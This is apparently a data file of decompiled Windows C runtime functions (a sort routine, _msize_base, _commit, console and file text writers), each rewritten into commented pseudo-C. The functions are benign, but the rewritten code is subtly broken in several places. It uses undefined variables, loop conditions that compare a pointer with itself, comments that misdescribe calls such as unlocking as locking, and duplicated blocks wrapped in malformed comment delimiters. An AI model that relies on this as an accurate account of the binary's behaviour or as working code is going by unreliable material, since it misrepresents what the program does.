{"Function Name": "FUN_14001d59b", "Address": "14001d59b", "Source Code": "\nvoid FUN_14001d59b(longlong input_address, longlong size)\n{\n    undefined1 temp_value; // Temporary variable for swapping values\n    int return_value; // Variable to store return value of function calls\n    longlong half_size; // Temporary variable for calculations\n    undefined1 *swap_pointer_1; // Pointer for swapping values\n    undefined1 *swap_pointer_2; // Pointer for iterating through array\n    undefined1 *middle_pointer; // Pointer for iterating through another array\n    undefined1 *base_address; // Pointer for base address calculation\n    ulonglong loop_counter; // Variable for loop control\n    undefined1 *data_pointer; // Pointer to an undefined data type\n    ulonglong element_size; // Variable for size or offset\n    longlong result_counter = 0; // Local variable to track results\n    \n    // Calculate the starting address based on param_2 and param_1\n    base_address = (undefined1 *)((size - 1) * element_size + input_address);\n    \nLAB_14001d5e0:\n    // Main loop to process data\n    while ((loop_counter = (ulonglong)((longlong)base_address - (longlong)data_pointer) / element_size + 1, 8 < loop_counter)) {\n        half_size = (loop_counter >> 1) * element_size; // Calculate half the size\n        middle_pointer = data_pointer + half_size; // Set pointer to the middle of the range\n        // Call a function and check the return value\n        return_value = (*(code *)PTR__guard_dispatch_icall_1400213e8)(data_pointer, middle_pointer);\n        // If the function call is successful and pointers are not equal\n        if ((0 < return_value) && (data_pointer != middle_pointer)) {\n            do {\n                // Swap values between two pointers\n                temp_value = middle_pointer[-half_size];\n                middle_pointer[-half_size] = *middle_pointer;\n                *middle_pointer = temp_value;\n                loop_counter--; // Decrement loop counter\n                middle_pointer++; // Move to the next element\n            } while (loop_counter != 0); // Continue until all elements are processed\n        }\n        // Call a function for the next pointer\n        return_value = (*(code *)PTR__guard_dispatch_icall_1400213e8)(data_pointer, base_address);\n        // If the function call is successful and pointers are not equal\n        if ((0 < return_value) && (data_pointer != base_address)) {\n            swap_pointer_2 = base_address; // Set pointer for swapping\n            loop_counter = element_size; // Reset loop counter\n            do {\n                // Swap values between two pointers\n                temp_value = swap_pointer_2[(longlong)data_pointer - (longlong)base_address];\n                swap_pointer_2[(longlong)data_pointer - (longlong)base_address] = *swap_pointer_2;\n                *swap_pointer_2 = temp_value;\n                swap_pointer_2++; // Move to the next element\n                loop_counter--; // Decrement loop counter\n            } while (loop_counter != 0); // Continue until all elements are processed\n        }\n        // Call a function for the next pointer\n        return_value = (*(code *)PTR__guard_dispatch_icall_1400213e8)(middle_pointer);\n        // If the function call is successful and pointers are not equal\n        if ((0 < return_value) && (middle_pointer != base_address)) {\n            swap_pointer_1 = base_address; // Set pointer for swapping\n            loop_counter = element_size; // Reset loop counter\n            do {\n                // Swap values between two pointers\n                temp_value = swap_pointer_1[(longlong)middle_pointer - (longlong)base_address];\n                swap_pointer_1[(longlong)middle_pointer - (longlong)base_address] = *swap_pointer_1;\n                *swap_pointer_1 = temp_value;\n                swap_pointer_1++; // Move to the next element\n                loop_counter--; // Decrement loop counter\n            } while (loop_counter != 0); // Continue until all elements are processed\n        }\n        \nLAB_14001d760:\n        // Check if the first pointer is less than the second\n        if (swap_pointer_2 < middle_pointer) {\n            do {\n                swap_pointer_2 += element_size; // Move to the next block\n                // If the end pointer is reached, exit the loop\n                if (middle_pointer <= swap_pointer_2) goto LAB_14001d785;\n                // Call a function and check the return value\n                return_value = (*(code *)PTR__guard_dispatch_icall_1400213e8)(swap_pointer_2);\n            } while (return_value < 1); // Continue until a valid return value\n            // If the end pointer is reached, exit the loop\n            if (middle_pointer <= swap_pointer_2) goto LAB_14001d785;\n        } else {\nLAB_14001d785:\n            // If the first pointer is not less than the second\n            do {\n                swap_pointer_2 += element_size; // Move to the next block\n                // If the start pointer is reached, exit the loop\n                if (base_address < swap_pointer_2) break;\n                // Call a function and check the return value\n                return_value = (*(code *)PTR__guard_dispatch_icall_1400213e8)(swap_pointer_2);\n            } while (return_value < 1); // Continue until a valid return value\n        }\n        // Decrement the second pointer and check conditions\n        do {\n            middle_pointer -= element_size; // Move to the previous block\n            // If the pointer goes out of bounds, exit the loop\n            if (middle_pointer <= swap_pointer_1) break;\n            // Call a function and check the return value\n            return_value = (*(code *)PTR__guard_dispatch_icall_1400213e8)(middle_pointer);\n        } while (0 < return_value); // Continue until a valid return value\n        \n        // Check if the pointers are within bounds\n        if (swap_pointer_2 <= middle_pointer) {\n            // If the pointers are not equal\n            if (swap_pointer_2 != middle_pointer) {\n                middle_pointer = puVar7; // Set pointer for swapping\n                loop_counter = element_size; // Reset loop counter\n                do {\n                    // Swap values between two pointers\n                    temp_value = middle_pointer[(longlong)swap_pointer_2 - (longlong)puVar7];\n                    middle_pointer[(longlong)swap_pointer_2 - (longlong)puVar7] = *middle_pointer;\n                    *middle_pointer = temp_value;\n                    middle_pointer++; // Move to the next element\n                    loop_counter--; // Decrement loop counter\n                } while (loop_counter != 0); // Continue until all elements are processed\n            }\n            middle_pointer = swap_pointer_2; // Update pointer for next iteration\n            // If the pointers are not equal\n            if (swap_pointer_1 != puVar7) {\n                middle_pointer = swap_pointer_1; // Update pointer for next iteration\n            }\n            goto LAB_14001d760; // Repeat the main loop\n        }\n        \n        // Check if the first pointer is less than the second\n        if (swap_pointer_1 < middle_pointer) {\n            do {\n                middle_pointer -= element_size; // Move to the previous block\n                // If the pointer goes out of bounds, exit the loop\n                if (middle_pointer <= swap_pointer_1) goto LAB_14001d830;\n                // Call a function and check the return value\n                return_value = (*(code *)PTR__guard_dispatch_icall_1400213e8)(middle_pointer);\n            } while (return_value == 0); // Continue until a valid return value\n            // If the pointer goes out of bounds, exit the loop\n            if (middle_pointer <= swap_pointer_1) goto LAB_14001d830;\n        } else {\nLAB_14001d830:\n            // If the first pointer is not less than the second\n            do {\n                middle_pointer -= element_size; // Move to the previous block\n                // If the pointer goes out of bounds, exit the loop\n                if (middle_pointer <= data_pointer) break;\n                // Call a function and check the return value\n                return_value = (*(code *)PTR__guard_dispatch_icall_1400213e8)(middle_pointer);\n            } while (return_value == 0); // Continue until a valid return value\n        }\n        \n        // Check if the distance between pointers is less than a threshold\n        if ((longlong)middle_pointer - (longlong)data_pointer < (longlong)base_address - (longlong)swap_pointer_2)\n            goto LAB_14001d88c; // Go to the next section if true\n        \n        // If the first pointer is less than the second\n        if (data_pointer < middle_pointer) {\n            // Store pointers in a local stack\n            *(undefined1 **)(&stack0x00000030 + result_counter * 8) = data_pointer;\n            *(undefined1 **)(&stack0x00000220 + result_counter * 8) = middle_pointer;\n            result_counter++; // Increment local result counter\n        }\n        data_pointer = swap_pointer_2; // Update pointer for next iteration\n        // If the end pointer is reached, exit the loop\n        if (base_address <= swap_pointer_2) goto LAB_14001d663;\n    }\n    \n    // Loop to process remaining elements\n    for (; swap_pointer_2 < base_address; base_address -= element_size) {\n        while (middle_pointer <= base_address) {\n            // Call a function and check the return value\n            return_value = (*(code *)PTR__guard_dispatch_icall_1400213e8)(middle_pointer, swap_pointer_2);\n            if (0 < return_value) {\n                swap_pointer_2 = middle_pointer; // Update pointer if valid\n            }\n            middle_pointer += element_size; // Move to the next block\n        }\n        // If pointers are not equal, swap values\n        if (swap_pointer_2 != base_address) {\n            middle_pointer = base_address; // Set pointer for swapping\n            loop_counter = element_size; // Reset loop counter\n            do {\n                // Swap values between two pointers\n                temp_value = middle_pointer[(longlong)swap_pointer_2 - (longlong)base_address];\n                middle_pointer[(longlong)swap_pointer_2 - (longlong)base_address] = *middle_pointer;\n                *middle_pointer = temp_value;\n                middle_pointer++; // Move to the next element\n                loop_counter--; // Decrement loop counter\n            } while (loop_counter != 0); // Continue until all elements are processed\n        }\n    }\n    \n    goto LAB_14001d663; // Go to the end of the function\n    \nLAB_14001d88c:\n    // If the first pointer is less than the second\n    if (swap_pointer_2 < base_address) {\n        // Store pointers in a local stack\n        *(undefined1 **)(&stack0x00000030 + result_counter * 8) = swap_pointer_2;\n        *(undefined1 **)(&stack0x00000220 + result_counter * 8) = base_address;\n        result_counter++; // Increment local result counter\n    }\n    \n    base_address = middle_pointer; // Update pointer for next iteration\n    // If the pointer is less than or equal to the previous pointer\n    if (middle_pointer <= data_pointer) {\nLAB_14001d663:\n        half_size = result_counter - 1; // Get the last index of local results\n        // Check if there are no results\n        if (result_counter < 1) {\n            __security_check_cookie(in_stack_00000410 ^ (ulonglong)&stack0x00000000); // Security check\n            return; // Exit the function\n        }\n        // Retrieve pointers from the local stack\n        data_pointer = *(undefined1 **)(&stack0x00000030 + half_size * 8);\n        base_address = *(undefined1 **)(&stack0x00000220 + half_size * 8);\n        result_counter = half_size; // Update local result counter\n    }\n    goto LAB_14001d5e0; // Repeat the main loop\n}\n"}
{"Function Name": "FUN_14001d8df", "Address": "14001d8df", "Source Code": "\nvoid performSecurityCheck(void)\n{\n    // Perform a security check on the stack cookie to prevent buffer overflows\n    __security_check_cookie(*(ulonglong*)&stackCookie);\n    \n    // Exit the function\n    return;\n}\n"}
{"Function Name": "FUN_14001d900", "Address": "14001d900", "Source Code": "\nbool isMultibyteInitialized(void)\n{\n    // Call the function __acrt_initialize_multibyte() and cast its return value to a char\n    // Check if the returned value is equal to the null character '\\0'\n    return (char)initializeMultibyte() == '\\0';\n}\n"}
{"Function Name": "_msize_base", "Address": "14001d918", "Source Code": "\nundefined8 _msize_base(longlong input_parameter)\n{\n    // Check if the input parameter is zero\n    if (input_parameter == 0) {\n        // Set the DOS error number to 0x16 (ERROR_INVALID_PARAMETER)\n        *dos_error() = 0x16;\n        // Call a function to handle the error\n        handle_error();\n        // Return an error value (0xFFFFFFFFFFFFFFFF)\n        return 0xffffffffffffffff;\n    }\n    // Return the size of the heap block associated with the given parameter\n    return get_heap_size(heap_handle, 0, input_parameter);\n}\n"}
{"Function Name": "__crt_seh_guarded_call<int>::operator()<class_<lambda_a37b2b86f63e897a80ea819b0eb08c01>,class_<lambda_38ce7e780aa69e748d6df282ebc68efe>&___ptr64,class_<lambda_99fb1378e971ab6e7edea83e3a7a83a2>_>", "Address": "14001d954", "Source Code": "\\*\nint __thiscall\n__crt_seh_guarded_call<int>::\noperator()<class_<lambda_a37b2b86f63e897a80ea819b0eb08c01>,class_<lambda_38ce7e780aa69e748d6df282ebc68efe>&___ptr64,class_<lambda_99fb1378e971ab6e7edea83e3a7a83a2>_>\n(__crt_seh_guarded_call<int> *this,<lambda_a37b2b86f63e897a80ea819b0eb08c01> *param_1,\n<lambda_38ce7e780aa69e748d6df282ebc68efe> *param_2,\n<lambda_99fb1378e971ab6e7edea83e3a7a83a2> *param_3)\n{\n    // Retrieve the file handle from param_2\n    uint _FileHandle = **(uint **)param_2;\n\n    // Lock the file handle for exclusive access using param_1\n    FID_conflict___acrt_lowio_lock_fh(*(uint *)param_1);\n\n    // Check if the file handle is valid and not in use\n    if ((*(byte *)((&DAT_14003a480)[(longlong)(int)_FileHandle >> 6] + 0x38 +\n        (ulonglong)(_FileHandle & 0x3f) * 0x48) & 1) != 0) {\n        \n        // Get the OS file handle from the file descriptor\n        HANDLE hFile = (HANDLE)_get_osfhandle(_FileHandle);\n        \n        // Attempt to flush the file buffers\n        if (FlushFileBuffers(hFile)) {\n            // Lock the file handle for exclusive access using param_3\n            FID_conflict___acrt_lowio_lock_fh(*(uint *)param_3);\n            return 0; // Return success\n        }\n        \n        // Retrieve the last error code if flushing fails\n        DWORD DVar2 = GetLastError();\n        *__doserrno() = DVar2; // Set the DOS error number\n    }\n    \n    // Set the DOS error number to 9 (invalid handle)\n    *__doserrno() = 9;\n    \n    // Lock the file handle for exclusive access using param_3\n    FID_conflict___acrt_lowio_lock_fh(*(uint *)param_3);\n    return -1; // Return failure\n}\n*\\ \n \n\nint __thiscall\n__crt_seh_guarded_call<int>::\noperator()<class_<lambda_a37b2b86f63e897a80ea819b0eb08c01>,class_<lambda_38ce7e780aa69e748d6df282ebc68efe>&___ptr64,class_<lambda_99fb1378e971ab6e7edea83e3a7a83a2>_>\n(__crt_seh_guarded_call<int> *this,<lambda_a37b2b86f63e897a80ea819b0eb08c01> *param_1,\n<lambda_38ce7e780aa69e748d6df282ebc68efe> *param_2,\n<lambda_99fb1378e971ab6e7edea83e3a7a83a2> *param_3)\n{\nuint _FileHandle = **(uint **)param_2;\nFID_conflict___acrt_lowio_lock_fh(*(uint *)param_1);\nif ((*(byte *)((&DAT_14003a480)[(longlong)(int)_FileHandle >> 6] + 0x38 +\n(ulonglong)(_FileHandle & 0x3f) * 0x48) & 1) != 0) {\nHANDLE hFile = (HANDLE)_get_osfhandle(_FileHandle);\nif (FlushFileBuffers(hFile)) {\nFID_conflict___acrt_lowio_lock_fh(*(uint *)param_3);\nreturn 0;\n}\nDWORD DVar2 = GetLastError();\n*__doserrno() = DVar2;\n}\n*__doserrno() = 9;\nFID_conflict___acrt_lowio_lock_fh(*(uint *)param_3);\nreturn -1;\n}\n"}
{"Function Name": "_commit", "Address": "14001d9e0", "Source Code": "\\*\nint __cdecl _commit(int file_handle) // Function to commit changes to a file\n{\n    int return_value; // Variable to store return value of the guarded call\n    ulong *dos_error_ptr; // Pointer to store the address of the DOS error number\n    int file_handle_array[2]; // Local array to hold file handle for guarded call\n    int *file_handle_ptr_array[3]; // Local array to hold pointer to file handle\n\n    if (file_handle == -2) { // Check if the file handle is invalid\n        dos_error_ptr = __doserrno(); // Get the address of the DOS error number\n        *dos_error_ptr = 9; // Set the error number to 9 (invalid handle)\n    } else {\n        // Check if the file handle is valid and within bounds\n        if (((-1 < file_handle) && ((uint)file_handle < DAT_14003a880)) &&\n            ((*(byte *)((&DAT_14003a480)[(longlong)file_handle >> 6] + 0x38 +\n            (ulonglong)(file_handle & 0x3f) * 0x48) & 1) != 0)) {\n            file_handle_ptr_array[0] = &file_handle; // Store the address of the file handle\n            file_handle_array[0] = file_handle; // Store the file handle in local array\n            // Perform a guarded call with the file handle\n            return_value = __crt_seh_guarded_call<int>::\n                operator()<class_<lambda_a37b2b86f63e897a80ea819b0eb08c01>,class_<lambda_38ce7e780aa69e748d6df282ebc68efe>&___ptr64,class_<lambda_99fb1378e971ab6e7edea83e3a7a83a2>_>\n                (nullptr, (class_<lambda_a37b2b86f63e897a80ea819b0eb08c01> *)file_handle_array,\n                (class_<lambda_38ce7e780aa69e748d6df282ebc68efe> *)file_handle_ptr_array,\n                (class_<lambda_99fb1378e971ab6e7edea83e3a7a83a2> *)file_handle_array);\n            return return_value; // Return the result of the guarded call\n        }\n        dos_error_ptr = __doserrno(); // Get the address of the DOS error number\n        *dos_error_ptr = 9; // Set the error number to 9 (invalid handle)\n        FUN_14000ecf8(); // Call a function to handle the error\n    }\n    return -1; // Return -1 indicating failure\n}\n*\\ \n \n\nint __cdecl _commit(int file_handle)\n{\n    int return_value;\n    ulong *dos_error_ptr;\n    int file_handle_array[2];\n    int *file_handle_ptr_array[3];\n\n    if (file_handle == -2) {\n        dos_error_ptr = __doserrno();\n        *dos_error_ptr = 9;\n    } else {\n        if (((-1 < file_handle) && ((uint)file_handle < DAT_14003a880)) &&\n            ((*(byte *)((&DAT_14003a480)[(longlong)file_handle >> 6] + 0x38 +\n            (ulonglong)(file_handle & 0x3f) * 0x48) & 1) != 0)) {\n            file_handle_ptr_array[0] = &file_handle;\n            file_handle_array[0] = file_handle;\n            return_value = __crt_seh_guarded_call<int>::\n                operator()<class_<lambda_a37b2b86f63e897a80ea819b0eb08c01>,class_<lambda_38ce7e780aa69e748d6df282ebc68efe>&___ptr64,class_<lambda_99fb1378e971ab6e7edea83e3a7a83a2>_>\n                (nullptr, (class_<lambda_a37b2b86f63e897a80ea819b0eb08c01> *)file_handle_array,\n                (class_<lambda_38ce7e780aa69e748d6df282ebc68efe> *)file_handle_ptr_array,\n                (class_<lambda_99fb1378e971ab6e7edea83e3a7a83a2> *)file_handle_array);\n            return return_value;\n        }\n        dos_error_ptr = __doserrno();\n        *dos_error_ptr = 9;\n        FUN_14000ecf8();\n    }\n    return -1;\n}\n"}
{"Function Name": "write_double_translated_ansi_nolock", "Address": "14001da74", "Source Code": "\nvoid __cdecl write_double_translated_ansi_nolock(int param_1, char *param_2, uint param_3) {\n    ulonglong calculatedValue; // Variable to store a calculated ulonglong value\n    longlong pointerDifference, dataPointer, indexValue; // Longlong variables for various calculations\n    uint characterCount; // Variable to store a uint value\n    byte *bytePointer, *endPointer; // Byte pointers for data manipulation\n    HANDLE handle; // Handle for console or file operations\n    undefined8 resultValue; // Variable to store a 64-bit value\n    uint consoleCodePage; // Variable to store console code page\n    ulonglong initialValue; // Variable to store a ulonglong value\n    char charArray[2]; // Array to store character data\n    wchar_t wideCharArray[2]; // Array to store wide character data\n    size_t size; // Size variable for string manipulation\n    bool isNull; // Boolean variable for condition checking\n\n    bytePointer = (byte *)CONCAT44(param_3, 0); // Combine param_3 with 0 to create a byte pointer\n    calculatedValue = (ulonglong)((uint)param_2 & 0x3f); // Calculate index based on param_2\n    indexValue = (longlong)(int)(uint)param_2 >> 6; // Shift param_2 to get a longlong value\n    handle = *(HANDLE *)((&DAT_14003a480)[indexValue] + 0x28 + calculatedValue * 0x48); // Retrieve handle from a data structure\n    consoleCodePage = GetConsoleCP(); // Get the current console code page\n    initialValue = 0; // Initialize local_b0 to 0\n    resultValue = 0; // Initialize local_c8 to 0\n\n    if (bytePointer < endPointer) { // Check if pbVar16 is less than pbVar21\n        charArray[0] = CONCAT11(charArray[0]._1_1_, *bytePointer); // Store the first byte in local_f8\n        wideCharArray[0] = L'\\0'; // Initialize the first wide character to null\n        wideCharArray[1] = L'\\0'; // Initialize the second wide character to null\n        size = 1; // Set size variable to 1\n        characterCount = 1; // Initialize uVar9 to 1\n\n        if (consoleCodePage == 0xfde9) { // Check if the console code page matches a specific value\n            dataPointer = (&DAT_14003a480)[indexValue]; // Retrieve a pointer from a data structure\n            ulonglong tempCount = 0; // Initialize uVar10 to 0\n            ulonglong charCounter = 0; // Initialize uVar15 to 0\n\n            do { // Loop to count characters until a null terminator is found\n                characterCount = (uint)tempCount; // Update uVar9 with the current count\n                if (*(char *)(dataPointer + calculatedValue * 0x48 + 0x3e + charCounter) == '\\0') break; // Break if null terminator is found\n                characterCount++; // Increment uVar9\n                tempCount = (ulonglong)characterCount; // Update uVar10\n                charCounter++; // Increment uVar15\n            } while ((longlong)charCounter < 5); // Limit loop to 5 iterations\n\n            if (0 < (longlong)charCounter) { // Check if any characters were counted\n                pointerDifference = (longlong)local_a8 - (longlong)bytePointer; // Calculate the difference in pointers\n                char retrievedChar = (&DAT_140038a00)[*(byte *)((&DAT_14003a480)[indexValue] + 0x3e + calculatedValue * 0x48)]; // Retrieve character from data structure\n                int bufferSize = (retrievedChar + 1) - characterCount; // Calculate the difference for buffer size\n\n                if (bufferSize <= pointerDifference) { // Check if there is enough space in the buffer\n                    if (0 < (longlong)charCounter) { // If there are characters to copy\n                        for (ulonglong copyIndex = 0; copyIndex < charCounter; copyIndex++) { // Loop to copy characters\n                            charArray[copyIndex] = *(char *)(copyIndex + dataPointer + 0x3e + calculatedValue * 0x48); // Copy character to local_f8\n                        }\n                    }\n                    if (0 < bufferSize) { // If there is space to write\n                        FUN_14000c330((undefined8 *)(charArray + charCounter), (undefined8 *)bytePointer, (longlong)bufferSize); // Call function to write data\n                    }\n                    if (0 < (longlong)charCounter) { // If there are characters to clear\n                        for (longlong clearIndex = 0; clearIndex < (longlong)charCounter; clearIndex++) { // Loop to clear characters\n                            *(undefined1 *)((&DAT_14003a480)[indexValue] + 0x3e + calculatedValue * 0x48 + clearIndex) = 0; // Set character to null\n                        }\n                    }\n                    resultValue = CONCAT44(bufferSize + (int)pointerDifference, (undefined4)resultValue); // Update local_c8 with new values\n                    goto LAB_14001de5b; // Jump to the end of the function\n                }\n            }\n        }\n    }\n    resultValue = CONCAT44(initialValue, (undefined4)resultValue); // Update local_c8 with local_b0\n    isNull = local_d0 == '\\0'; // Check if local_d0 is null\n    LAB_14001de5b: // Label for function exit\n    if (!isNull) { // If local_d0 is not null\n        *(uint *)(local_e8 + 0x3a8) &= 0xfffffffd; // Modify a specific value in local_e8\n    }\n    *local_60 = resultValue; // Store the result in local_60\n    *(int *)(local_60 + 1) = (int)initialValue; // Store local_b0 in the next position of local_60\n    return; // Exit the function\n}\n"}
{"Function Name": "write_text_ansi_nolock", "Address": "14001df50", "Source Code": "\nvoid __cdecl write_text_ansi_nolock(int fileDescriptor, char *inputBuffer, uint bufferSize)\n{\n    char currentChar; // Variable to hold the current character being processed\n    HANDLE fileHandle; // Handle for the file to write to\n    BOOL writeSuccess; // Variable to store the result of the WriteFile function\n    DWORD lastErrorCode; // Variable to store the last error code\n    DWORD *errorTracking; // Pointer to an array for error tracking\n    uint bytesToWrite; // Number of bytes to write to the file\n    char *localBufferPtr; // Pointer for writing characters to local buffer\n    char *inputBufferPtr; // Pointer for reading characters from the input buffer\n    char *inputBufferEnd; // Pointer for processing characters from the input buffer\n    uint bytesWrittenAndError[4]; // Local array to store number of bytes written and error code\n    char localBuffer[5120]; // Local buffer to hold characters before writing to file\n\n    inputBufferEnd = (char *)CONCAT44(bufferSize, bufferSize); // Initialize pcVar7 with the input parameter\n    errorTracking = (DWORD *)CONCAT44(fileDescriptor, fileDescriptor); // Initialize pDVar4 with the input parameter\n    fileHandle = *(HANDLE *)((&DAT_14003a480)[(longlong)(int)(uint)inputBuffer >> 6] + 0x28 + (ulonglong)((uint)inputBuffer & 0x3f) * 0x48); // Retrieve file handle based on param_2\n    errorTracking[0] = 0; // Initialize error code to 0\n    errorTracking[1] = 0; // Initialize number of bytes written to 0\n    errorTracking[2] = 0; // Initialize newline count to 0\n\n    do {\n        if (inputBufferPtr <= inputBufferEnd) break; // Exit loop if end of input buffer is reached\n        localBufferPtr = localBuffer; // Reset local buffer pointer\n        do {\n            if (inputBufferPtr <= inputBufferEnd) break; // Exit inner loop if end of input buffer is reached\n            currentChar = *inputBufferEnd; // Get the current character from the input buffer\n            inputBufferEnd = inputBufferEnd + 1; // Move to the next character in the input buffer\n            if (currentChar == '\\n') { // Check if the character is a newline\n                errorTracking[2] = errorTracking[2] + 1; // Increment newline count\n                *localBufferPtr = '\\r'; // Add carriage return before newline\n                localBufferPtr = localBufferPtr + 1; // Move to the next position in the local buffer\n            }\n            *localBufferPtr = currentChar; // Copy the current character to the local buffer\n            localBufferPtr = localBufferPtr + 1; // Move to the next position in the local buffer\n        } while (localBufferPtr < localBuffer + 0x13ff); // Limit the buffer size to prevent overflow\n        \n        bytesToWrite = (int)localBufferPtr - (int)localBuffer; // Calculate number of bytes to write\n        writeSuccess = WriteFile(fileHandle, localBuffer, bytesToWrite, bytesWrittenAndError, (LPOVERLAPPED)0x0); // Write to the file\n        if (writeSuccess == 0) { // Check if the write operation failed\n            lastErrorCode = GetLastError(); // Get the last error code\n            *errorTracking = lastErrorCode; // Store the error code in the error tracking array\n            break; // Exit the loop on error\n        }\n        errorTracking[1] = errorTracking[1] + bytesWrittenAndError[0]; // Update the number of bytes written\n    } while (bytesToWrite <= bytesWrittenAndError[0]); // Continue writing until all bytes are written\n\n    return; // Exit the function\n}\n"}
{"Function Name": "write_text_utf16le_nolock", "Address": "14001e054", "Source Code": "\nvoid __cdecl write_text_utf16le_nolock(int param_1, char *param_2, uint param_3)\n{\n    short shortValue; // Variable to hold a short value from the input\n    HANDLE fileHandle; // Handle for the file to write to\n    uint bytesToWrite; // Number of bytes to write to the file\n    BOOL writeSuccess; // Variable to check the success of the WriteFile function\n    DWORD lastErrorCode; // Variable to hold the last error code\n    DWORD *errorInfoPointer; // Pointer to store error information\n    short *localBufferPointer; // Pointer for writing short values to local buffer\n    short *inputPointer; // Pointer for reading short values from input\n    uint bytesWrittenBuffer[4]; // Local buffer to hold the number of bytes written\n    short textDataBuffer[2560]; // Local buffer to hold the text data to be written\n    ulonglong securityCookie; // Variable for security cookie\n    undefined8 stackVariable; // Stack variable for additional data\n\n    inputPointer = (short *)CONCAT44(param_3, 0); // Initialize pointer for input data\n    errorInfoPointer = (DWORD *)CONCAT44(param_1, 0); // Initialize pointer for error information\n    stackVariable = 0x14001e06c; // Initialize stack variable with a specific value\n    securityCookie = DAT_140038080 ^ (ulonglong)0; // Initialize security cookie\n\n    // Retrieve the file handle based on the input parameter\n    fileHandle = *(HANDLE *)((&DAT_14003a480)[(longlong)(int)(uint)param_2 >> 6] + 0x28 +\n                       (ulonglong)((uint)param_2 & 0x3f) * 0x48);\n    errorInfoPointer[0] = 0; // Initialize error code to 0\n    errorInfoPointer[1] = 0; // Initialize bytes written to 0\n    errorInfoPointer[2] = 0; // Initialize additional error information to 0\n\n    do {\n        // Check if there are no more characters to process\n        if (inputPointer <= inputPointer) break;\n        localBufferPointer = textDataBuffer; // Reset the local buffer pointer\n        do {\n            // Check if there are no more characters to process\n            if (inputPointer <= inputPointer) break;\n            shortValue = *inputPointer; // Read a short value from the input\n            inputPointer = inputPointer + 1; // Move to the next character\n            if (shortValue == 10) { // Check for newline character\n                errorInfoPointer[2] += 2; // Increment the count for newlines\n                *localBufferPointer++ = 0xd; // Add carriage return to the buffer\n            }\n            *localBufferPointer++ = shortValue; // Write the character to the buffer\n        } while (localBufferPointer < textDataBuffer + 0x9ff); // Limit the buffer size\n        \n        bytesToWrite = (int)((longlong)localBufferPointer - (longlong)textDataBuffer >> 1) * 2; // Calculate number of bytes to write\n        writeSuccess = WriteFile(fileHandle, textDataBuffer, bytesToWrite, bytesWrittenBuffer, (LPOVERLAPPED)0); // Write to the file\n        if (writeSuccess == 0) { // Check if the write operation failed\n            lastErrorCode = GetLastError(); // Retrieve the last error code\n            *errorInfoPointer = lastErrorCode; // Store the error code\n            break; // Exit the loop on error\n        }\n        errorInfoPointer[1] += bytesWrittenBuffer[0]; // Update the total bytes written\n    } while (bytesToWrite <= bytesWrittenBuffer[0]); // Continue if there are more bytes to write\n\n    __security_check_cookie(securityCookie); // Check the security cookie for integrity\n    return; // Exit the function\n}\n"}
{"Function Name": "write_text_utf8_nolock", "Address": "14001e170", "Source Code": "\nvoid __cdecl write_text_utf8_nolock(int fileDescriptor, char *inputWideCharPtr, uint inputLength)\n{\n    WCHAR currentWideChar; // Variable to hold a wide character\n    HANDLE fileHandle; // Handle for the file to write to\n    uint bytesConverted; // Variable to store the result of WideCharToMultiByte\n    BOOL writeSuccess; // Variable to store the result of WriteFile\n    DWORD lastErrorCode; // Variable to store the last error code\n    WCHAR *outputWideCharPtr; // Pointer for writing wide characters\n    WCHAR *inputWideCharPtrCurrent; // Pointer for input wide characters\n    uint bytesWritten; // Variable to track the number of bytes written\n    ulonglong totalBytesWritten; // Variable to track the total bytes written\n    WCHAR wideCharBuffer[856]; // Buffer to hold wide characters\n    CHAR multiByteBuffer[3424]; // Buffer to hold converted multi-byte characters\n    DWORD errorInfoArray[4]; // Array to hold error information\n\n    // Initialize pWVar9 with the address of the input parameter\n    inputWideCharPtrCurrent = (WCHAR *)CONCAT44(inputLength, inputLength);\n    \n    // Retrieve the file handle based on the input parameter\n    fileHandle = *(HANDLE *)((&DAT_14003a480)[(longlong)(int)(uint)inputWideCharPtr >> 6] + 0x28 + (ulonglong)((uint)inputWideCharPtr & 0x3f) * 0x48);\n    \n    // Initialize the local error information array\n    errorInfoArray[0] = 0;\n    errorInfoArray[1] = 0;\n    errorInfoArray[2] = 0;\n\n    do {\n        // Check if pWVar9 is valid\n        if (inputWideCharPtrCurrent <= inputWideCharPtrCurrent) {\n            __security_check_cookie(0); // Security check\n            return; // Exit if invalid\n        }\n        \n        outputWideCharPtr = wideCharBuffer; // Set pWVar5 to the start of the local buffer\n        do {\n            // Check if pWVar9 is valid\n            if (inputWideCharPtrCurrent <= inputWideCharPtrCurrent) break;\n            \n            currentWideChar = *inputWideCharPtrCurrent; // Read a wide character\n            inputWideCharPtrCurrent = inputWideCharPtrCurrent + 1; // Move to the next character\n            \n            // If the character is a newline, insert a carriage return before it\n            if (currentWideChar == L'\\n') {\n                *outputWideCharPtr = L'\\r'; // Insert carriage return\n                outputWideCharPtr = outputWideCharPtr + 1; // Move to the next position in the buffer\n            }\n            *outputWideCharPtr = currentWideChar; // Write the character to the buffer\n            outputWideCharPtr = outputWideCharPtr + 1; // Move to the next position in the buffer\n        } while (outputWideCharPtr < wideCharBuffer + 0x354); // Limit the buffer size\n        \n        // Convert wide characters to multi-byte characters\n        bytesConverted = __acrt_WideCharToMultiByte(0xfde9, 0, wideCharBuffer, (int)((longlong)outputWideCharPtr - (longlong)wideCharBuffer >> 1), multiByteBuffer, 0xd55, (LPBOOL)0x0, (LPBOOL)0x0);\n        \n        // Check if the conversion was successful\n        if (bytesConverted == 0) {\n            lastErrorCode = GetLastError(); // Get the last error code\n            errorInfoArray[0] = lastErrorCode; // Store the error code\n            goto __exit; // Exit on error\n        }\n        \n        totalBytesWritten = 0; // Initialize the total bytes written\n        if (bytesConverted != 0) {\n            do {\n                // Write the converted bytes to the file\n                writeSuccess = WriteFile(fileHandle, multiByteBuffer + totalBytesWritten, bytesConverted - (int)totalBytesWritten, errorInfoArray, (LPOVERLAPPED)0x0);\n                \n                // Check if the write operation was successful\n                if (writeSuccess == 0) goto __exit; // Exit on error\n                \n                bytesWritten = (int)totalBytesWritten + errorInfoArray[0]; // Update the number of bytes written\n                totalBytesWritten = (ulonglong)bytesWritten; // Update the total bytes written\n            } while (bytesWritten < bytesConverted); // Continue until all bytes are written\n        }\n        \n        errorInfoArray[1] = (int)inputWideCharPtrCurrent - inputLength; // Update the second element of the error information array\n    } while (true); // Infinite loop until an exit condition is met\n\n__exit:\n    return; // Exit the function\n}\n"}
